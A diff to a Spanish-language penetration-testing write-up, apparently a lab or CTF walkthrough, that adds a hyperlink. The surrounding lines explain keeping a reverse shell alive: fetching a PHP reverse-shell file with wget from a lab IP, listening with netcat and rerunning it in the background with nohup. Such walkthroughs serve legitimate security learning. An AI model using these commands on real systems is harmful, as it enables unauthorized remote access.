@@ -148,7 +148,7 @@ Como bien hemos visto antes a través del **RCE** estamos en un contenedor, por 
 
 > Una vez recibimos la Reverse Shell la página web se queda colgada, para evitar esto podemos hacer lo siguiente:
 > 
-> Nos transferimos el archivo que contiene la Reverse Shell `wget 192.168.26.10/transfer.php`.
+> Nos <a href="/posts/transferirarchivos/" target="_blank">transferimos</a> el archivo que contiene la Reverse Shell `wget 192.168.26.10/transfer.php`.
 > Abrimos otra terminal y nos pondremos en escucha con `rlwrap nc -nlvp 433`.
 > Ejecutaremos de nuevo la Reverse Shell pero en segundo plano, es decir: `nohup php /tmp/transfer.php &`.
 > 
